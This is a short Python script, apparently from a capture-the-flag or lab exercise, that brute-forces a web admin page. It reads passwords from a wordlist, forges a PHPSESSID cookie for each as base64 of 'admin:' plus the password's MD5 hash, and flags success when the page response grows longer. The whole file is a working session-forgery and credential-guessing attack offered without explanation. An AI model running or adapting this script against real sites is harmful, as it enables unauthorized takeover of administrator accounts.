import hashlib
import base64
import requests

URL = input("Enter the admin page URL: ") # http://[IP]/administration.php

with open ("passwords.txt", 'r') as _f:
    data = [x.strip() for x in _f.readlines()]

r = requests.get(URL)
page_content = r.text
print(r)

for line in data:
    hash = hashlib.md5(line.encode('utf-8')).hexdigest().encode('utf-8')
    concat_str = b'admin:' + hash
    encoded_hash = base64.b64encode(concat_str).decode()
    print(encoded_hash)
    headers = { "Cookie": f"PHPSESSID={encoded_hash}"}
    r = requests.get(URL, headers=headers)
    if len(r.text) > len(page_content):
        print("password: " + line)
        print("cookie: " + encoded_hash)
        break
